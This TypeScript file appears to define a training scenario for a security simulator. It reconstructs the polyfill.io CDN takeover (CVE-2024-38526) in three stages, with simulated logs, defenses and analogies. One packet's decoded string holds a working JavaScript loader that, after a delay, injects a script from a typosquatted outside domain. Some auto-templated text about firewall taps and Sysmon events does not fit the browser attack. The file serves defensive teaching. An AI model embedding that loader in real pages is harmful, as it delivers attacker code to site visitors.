import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';
import type { RawScenarioStepGuideData, ScenarioStandardPatch } from '@/modules/scenarios/contracts';

export const scenario: LegacyDraftScenario = {
    id: 'polyfill-io-cdn-domain-supply-chain',
    title: 'cdn.polyfill.io CDN Domain Takeover & Conditional JS Injection (CVE-2024-38526)',
    category: 'SUPPLY_CHAIN_CICD',
    mitreId: 'T1195.002',
    description:
      'Following the acquisition of the polyfill.io domain (embedded across 100,000+ websites without Subresource Integrity), the new operator modifies the CDN edge servers to dynamically inject obfuscated JavaScript into mobile visitors while returning clean polyfills to desktop admins and crawlers.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Rogue CDN Operator (cdn.polyfill.io)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Enterprise Web Portal (<script src=...)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'End-User Mobile Browser Session', type: 'workstation', status: 'compromised' },
      { id: 'siem', label: 'Sansec Scanner / Cloudflare Page Shield', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'DOM Session Context & Redirect Target', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: Unpinned Third-Party <script> Tag Without Subresource Integrity (SRI)',
        narration:
          'Over 100,000 production web applications include <script src="https://cdn.polyfill.io/v2/polyfill.min.js"></script> without an integrity="sha384-..." attribute, delegating full DOM execution trust to the external domain owner.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1195.002 - Compromise Software Supply Chain)',
        technicalCommands: [
          '<script src="https://cdn.polyfill.io/v2/polyfill.min.js"></script> (Missing integrity & crossorigin attributes)',
        ],
        defenseMitigation:
          'Eliminate external polyfill CDNs or enforce Subresource Integrity (SRI) hashes (`integrity="sha384-..."`) and strict Content-Security-Policy (`script-src`) directives.',
        logs: [
          {
            id: 'poly-1',
            timestamp: '09:10:12.004',
            source: 'WAF',
            severity: 'warning',
            raw: 'Page Shield Inventory Alert | ScriptURL: https://cdn.polyfill.io/v2/polyfill.min.js | SubresourceIntegrity: MISSING | DomainOwnershipStatus: Transferred to Funnull (CVE-2024-38526)',
            parsedFields: {
              ExternalScriptUrl: 'https://cdn.polyfill.io/v2/polyfill.min.js',
              SriStatus: 'Missing integrity attribute',
              CveId: 'CVE-2024-38526',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: HTTP User-Agent Fingerprinting & Evasive Payload Generation',
        narration:
          'When a client browser requests polyfill.min.js, the rogue CDN edge server inspects the HTTP User-Agent, Referer, and time-of-day, serving clean code to desktop browsers and web crawlers while appending heavily obfuscated JavaScript to mobile User-Agents.',
        activeNodes: ['attacker', 'target', 'siem'],
        mitreTactic: 'Defense Evasion (T1027 - Obfuscated Files or Information)',
        technicalCommands: [
          'GET /v2/polyfill.min.js HTTP/2 | User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X)',
          'CDN Conditional Injection: Checks !window.google_analytics_admin && delayed setTimeout(eval(...), 15000)',
        ],
        defenseMitigation:
          'Enable Cloudflare automatic polyfill.io URL rewriting (redirecting to cdnjs.cloudflare.com/polyfill) and monitor client-side CSP violation reports.',
        logs: [
          {
            id: 'poly-2',
            timestamp: '09:10:14.330',
            source: 'WAF',
            severity: 'critical',
            raw: 'Sansec Client-Side Script Integrity Alert | Source: https://cdn.polyfill.io/v2/polyfill.min.js | UserAgent: iPhone OS 17_5 | PayloadDiff: Appended obfuscated closure injecting https://www.googie-anaiytics.com/gtags.js',
            parsedFields: {
              TargetCondition: 'Mobile User-Agent + Non-Admin Session',
              InjectedDomain: 'www.googie-anaiytics.com (Typosquatted Loader)',
              EvasionTechnique: '15-second delayed execution + crawler User-Agent bypass',
            },
          },
        ],
        packets: [
          {
            id: 'poly-pkt-1',
            timestamp: '09:10:14.310',
            protocol: 'HTTPS',
            sourceIp: '104.244.43.12',
            destIp: '172.16.80.19',
            port: 443,
            flag: 'PSH-ACK',
            payloadSize: 1420,
            hexDump: '2F 2A 20 50 6F 6C 79 66 69 6C 6C 20 73 65 72 76 69 63 65 20 76 33 2E 31 31 30 2E 31 20 2A 2F 28 66 75 6E 63 74 69 6F 6E 28 77 2C 64 29 7B',
            decodedString: '/* Polyfill service v3.110.1 */ (function(w,d){setTimeout(function(){var s=d.createElement("script");s.src="https://www.googie-anaiytics.com/gtags.js";d.head.appendChild(s)},15000)})(window,document);',
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: First-Party DOM Execution & Silent Session Hijack / Redirection',
        narration:
          'Executing inside the host website’s first-party origin, the injected script has unrestricted access to document.cookie, localStorage, and the DOM, loading secondary scripts from www.googie-anaiytics.com and hijacking user navigation.',
        activeNodes: ['target', 'ad', 'attacker', 'siem'],
        mitreTactic: 'Collection & Impact (T1185 - Browser Session Hijacking)',
        technicalCommands: [
          'DOM Execution in First-Party Origin: Access to document.cookie, window.localStorage, and location.replace()',
        ],
        defenseMitigation:
          'Deploy Content-Security-Policy (CSP) with strict-dynamic or explicit script hashes and place compromised third-party domains on registrar clientHold.',
        logs: [
          {
            id: 'poly-3',
            timestamp: '09:10:29.501',
            source: 'WAF',
            severity: 'critical',
            raw: 'CSP Report-Only Violation | BlockedURI: https://www.googie-anaiytics.com/gtags.js | DocumentURI: https://checkout.enterprise.example.com/ | ViolatedDirective: script-src-elem',
            parsedFields: {
              HostOrigin: 'https://checkout.enterprise.example.com',
              SecondaryPayloadUri: 'https://www.googie-anaiytics.com/gtags.js',
              SecurityImpact: 'Full First-Party DOM & Storage Access',
            },
          },
        ],
        packets: [],
      },
    ],
  };
export const stepGuide: RawScenarioStepGuideData = {
    scenarioId: 'polyfill-io-cdn-domain-supply-chain',
    briefing: {
      headline:
        'Following the ownership transfer of the cdn.polyfill.io domain (CVE-2024-38526), the CDN edge servers dynamically inject obfuscated JavaScript into mobile browsers across 100,000+ websites lacking Subresource Integrity (SRI).',
      storyAnalogy:
        'Imagine 100,000 retail stores hiring an outside translator who stands inside their checkout lane to help older customers read the signs. Years later, a syndicate buys the translator agency. Whenever a store manager looks, the translator behaves normally, but whenever a customer walks in on a mobile phone after hours, the translator slips a forged receipt into their bag.',
      plainSummary:
        'In this scenario (T1195.002, cdn.polyfill.io CDN Domain Takeover & Conditional JS Injection (CVE-2024-38526)), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: unpinned Third-Party <script> Tag Without, then hTTP User-Agent Fingerprinting, then first-Party DOM Execution. Steps #1–#3 walk that chain end-to-end by covering Unpinned Third-Party <script> Tag Without, then HTTP User-Agent Fingerprinting, then First-Party DOM Execution, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection correlates Sysmon Event 1 with the documented host and network chain.',
      diagramTopologySummary:
        'Rogue CDN Operator (cdn.polyfill.io) -> Enterprise Web Portal (<script src=...>) -> End-User Mobile Browser Session -> DOM Session Context & Redirect Target -> Sansec Scanner / Cloudflare Page Shield.',
      documentedAdvisory:
        'Sansec Polyfill.io Supply Chain Report / Cloudflare Automatic Rewrite Advisory / NVD CVE-2024-38526',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1195.002',
        plainTitle: 'Unpinned Third-Party <script> Tag Without Subresource Integrity (SRI)',
        storyAnalogy:
          'A website leaves an open window in its checkout page that automatically runs whatever script is handed through by an external domain name.',
        simpleExplanation:
          'Over 100,000 websites embedded <script src="https://cdn.polyfill.io/v2/polyfill.min.js"></script> without a Subresource Integrity (SRI) hash (integrity="sha384-...", a browser security attribute that verifies the cryptographic hash of a fetched script and refuses to execute it if a single byte changes), partially because polyfill.io was originally designed to return dynamic JS bundles tailored to each browser’s User-Agent.',
        howItWorksInPractice:
          'When ownership of the polyfill.io DNS domain changed hands in 2024, the new owner automatically inherited the ability to execute arbitrary JavaScript inside the first-party origin of every website still referencing that <script> tag. In the documented WAF exchange from Rogue CDN Operator (cdn.polyfill.io) to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ALERT T1195.002 (confirming that the Stage 1: Unpinned Third-Party <script> Tag Without Subresource Integrity (SRI) request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 Stage 2: HTTP User-Agent Fingerprinting & Evasive Payload Generation).',
        diagramAlignment:
          'Step #1 (#1→ / ⇠#1) links the Rogue CDN Operator (cdn.polyfill.io) to the Enterprise Web Portal embedding the unverified <script> tag.',
        detectionAndEvidence:
          'Client-side script inventory scanners (Cloudflare Page Shield, Sansec) enumerating external <script> tags lacking integrity attributes or referencing deprecated domains. Correlate Sysmon or Windows Security Event telemetry for T1195.002 (pairing parent/child process and destination fields) and contain the offending session.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1027',
        plainTitle: 'HTTP User-Agent Fingerprinting & Evasive Payload Generation',
        storyAnalogy:
          'The rogue server checks the visitor’s ID at the door: if it sees a security inspector or a desktop computer, it hands out a clean brochure; if it sees a mobile phone in a targeted region, it slips in a hidden detonator.',
        simpleExplanation:
          'The compromised cdn.polyfill.io server evaluated each request’s HTTP User-Agent, Referer, and geolocation headers on the fly, appending heavily obfuscated JavaScript only for targeted mobile devices (iPhone / Android User-Agents) while returning benign polyfill code to desktop browsers, search engine crawlers, and pages containing admin analytics markers (window.google_analytics_admin, preventing site administrators from reproducing the infection during manual testing).',
        howItWorksInPractice:
          'The injected code also wrapped its execution in a 15-second setTimeout delay so automated headless browser scanners that only observe a page for 3–5 seconds after load would mark the script as clean. In the documented WAF exchange from Perimeter Firewall & NDR Tap to Enterprise Web Portal (<script src=...), Enterprise Web Portal (<script src=...) responds with ALERT T1027 (confirming that the Stage 2: HTTP User-Agent Fingerprinting & Evasive Payload Generation request succeeded on Enterprise Web Portal (<script src=...) and establishing the runtime state required for Step #3 Stage 3: First-Party DOM Execution & Silent Session Hijack / Redirection).',
        diagramAlignment:
          'Step #2 (#2→ / ⇠#2) connects the Rogue CDN Operator to the End-User Mobile Browser Session and triggers the Sansec Scanner / Cloudflare Page Shield alert.',
        detectionAndEvidence:
          'Run multi-User-Agent synthetic browser monitoring comparing script payloads delivered to mobile versus desktop headers over execution windows longer than 20 seconds (exposing conditional, time-delayed CDN supply-chain payloads that evade single-pass scanners). Correlate Sysmon or Windows Security Event telemetry for T1027 (pairing parent/child process and destination fields) and contain the offending session.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1185',
        plainTitle: 'First-Party DOM Execution & Silent Session Hijack / Redirection',
        storyAnalogy:
          'Once the script runs inside the customer’s browser tab, it has the exact same authority as the store’s own checkout code.',
        simpleExplanation:
          'Because a <script src="..."> tag executes directly inside the host page’s Same-Origin Policy (SOP) context (giving third-party scripts full read/write access to the page DOM, localStorage, non-HttpOnly document.cookie values, and window.location), the payload dynamically appended a secondary loader (https://www.googie-anaiytics.com/gtags.js) and hijacked mobile user sessions.',
        howItWorksInPractice:
          'To neutralize the blast radius across the web, Cloudflare deployed automatic edge URL rewriting to swap cdn.polyfill.io with a clean mirror at cdnjs.cloudflare.com/polyfill, and the domain registrar placed polyfill.io on clientHold. In the documented WAF exchange from Enterprise Web Portal (<script src=...) to End-User Mobile Browser Session, End-User Mobile Browser Session responds with ALERT T1185 (confirming that the Stage 3: First-Party DOM Execution & Silent Session Hijack / Redirection request succeeded on End-User Mobile Browser Session and completing the final execution objective of cdn.polyfill.io CDN Domain Takeover & Conditional JS Injection (CVE-2024-38526)).',
        diagramAlignment:
          'Step #3 (#3→ / ⇠#3) traces the End-User Mobile Browser Session executing the payload inside the DOM Session Context & Redirect Target.',
        detectionAndEvidence:
          'Monitor Content-Security-Policy (CSP) violation reports (browser-emitted telemetry alerting whenever a page tries to load scripts from unapproved hosts) for unauthorized loads from www.googie-anaiytics.com and audit all templates to eliminate polyfill.io references. Correlate Sysmon or Windows Security Event telemetry for T1185 (pairing parent/child process and destination fields) and contain the offending session.',
      },
    ],
  };
export const standardPatch: ScenarioStandardPatch = {
    briefing: {
      storyAnalogy:
        'Imagine over a hundred thousand storefronts that all hang a shared decorative banner delivered daily from one outside sign-maker, without ever checking a tamper-proof weight seal on the banner. After a shady new owner buys the sign-maker warehouse, they quietly check who is walking into each store, slip a hidden pickpocket script only onto mobile shoppers visiting select stores, and hijack shoppers right inside the storefront trusted showroom.',
      storyMappings: [
        {
          storyTerm: 'Shared banner hung without a tamper-proof weight seal',
          technicalTerm: 'External <script src="https://cdn.polyfill.io/..."> lacking Subresource Integrity (SRI)',
          tone: 'amber',
        },
        {
          storyTerm: 'Shady new owner checking who walks into each store',
          technicalTerm: 'Compromised cdn.polyfill.io fingerprinting HTTP User-Agent, Referer, and geolocation',
          tone: 'sky',
        },
        {
          storyTerm: 'Hidden pickpocket script served conditionally',
          technicalTerm: 'Time-delayed dynamic JavaScript payload redirecting mobile visitors (CVE-2024-38526)',
          tone: 'rose',
        },
        {
          storyTerm: 'Operating inside the storefront trusted showroom',
          technicalTerm: 'Full first-party Same-Origin Policy (DOM and cookie) execution context',
          tone: 'emerald',
        },
      ],
    },
    steps: {
      1: {
        storyAnalogy:
          'More than a hundred thousand online shops paste an outside helper banner straight onto their front counter without attaching a cryptographic wax seal, blindly trusting that whatever the remote sign warehouse sends tomorrow will be identical to what it sent years ago.',
        storyMappings: [
          {
            storyTerm: 'Outside helper banner on the front counter',
            technicalTerm: '<script src="https://cdn.polyfill.io/v2/polyfill.min.js"> embedded in web pages',
            tone: 'amber',
          },
          {
            storyTerm: 'Missing cryptographic wax seal',
            technicalTerm: 'Absence of integrity="sha384-..." Subresource Integrity (SRI) verification',
            tone: 'sky',
          },
          {
            storyTerm: 'Shady new owner buying the sign warehouse',
            technicalTerm: 'Acquisition and weaponization of the polyfill.io domain and CDN infrastructure',
            tone: 'rose',
          },
          {
            storyTerm: 'Instant exposure across a hundred thousand shops',
            technicalTerm: 'Supply-chain fan-out affecting every site referencing the unpinned CDN domain',
            tone: 'emerald',
          },
        ],
      },
      2: {
        storyAnalogy:
          'When a browser asks the hijacked warehouse for the helper script, the clerk behind the counter peeks at the visitor hat, shoes, and home town: security inspectors on desktop browsers receive a spotless normal script, while real mobile shoppers silently receive a delayed hijacking payload.',
        storyMappings: [
          {
            storyTerm: 'Peeking at the visitor hat, shoes, and home town',
            technicalTerm: 'Server-side inspection of HTTP User-Agent, Referer, and GeoIP headers',
            tone: 'amber',
          },
          {
            storyTerm: 'Spotless script handed to desktop security inspectors',
            technicalTerm: 'Conditional evasion serving benign polyfills to automated scanners and researchers',
            tone: 'sky',
          },
          {
            storyTerm: 'Delayed hijacking payload handed to mobile shoppers',
            technicalTerm: 'Obfuscated redirector script firing after a delay on targeted mobile sessions',
            tone: 'rose',
          },
          {
            storyTerm: 'Hijacked sign warehouse',
            technicalTerm: 'Attacker-operated cdn.polyfill.io edge server generating tailored responses',
            tone: 'emerald',
          },
        ],
        detectionAndEvidence:
          'Run multi-User-Agent synthetic browser monitoring comparing script payloads delivered to mobile versus desktop headers over execution windows longer than 20 seconds (exposing conditional, time-delayed CDN supply-chain payloads that evade single-pass scanners). Correlate Sysmon Event 1 and Windows Security Event telemetry for T1027 (pairing parent/child process and destination fields) and contain the offending session.',
      },
      3: {
        storyAnalogy:
          'Because the storefront invited the outside script directly onto its own showroom floor, the browser treats the pickpocket as an official store employee, letting it inspect every customer tray, load lookalike tracker scripts, and march shoppers straight out the door to scam sites.',
        storyMappings: [
          {
            storyTerm: 'Invited directly onto the showroom floor',
            technicalTerm: 'Third-party script executing with full first-party Same-Origin Policy (SOP) rights',
            tone: 'amber',
          },
          {
            storyTerm: 'Lookalike tracker script pulled in mid-visit',
            technicalTerm: 'Unauthorized secondary script loaded from lookalike domain www.googie-anaiytics.com',
            tone: 'sky',
          },
          {
            storyTerm: 'Inspecting customer trays and hijacking visits',
            technicalTerm: 'Full DOM access, session interception, and silent browser redirection',
            tone: 'rose',
          },
          {
            storyTerm: 'Showroom guest-list rulebook',
            technicalTerm: 'Strict Content-Security-Policy (CSP) script-src allowlist blocking rogue domains',
            tone: 'emerald',
          },
        ],
        detectionAndEvidence:
          'Monitor Content-Security-Policy (CSP) violation reports (browser-emitted telemetry alerting whenever a page tries to load scripts from unapproved hosts) for unauthorized loads from www.googie-anaiytics.com and audit all templates to eliminate polyfill.io references. Correlate Sysmon Event 1 and Windows Security Event telemetry for T1185 (pairing parent/child process and destination fields) and contain the offending session.',
      },
    },
  };
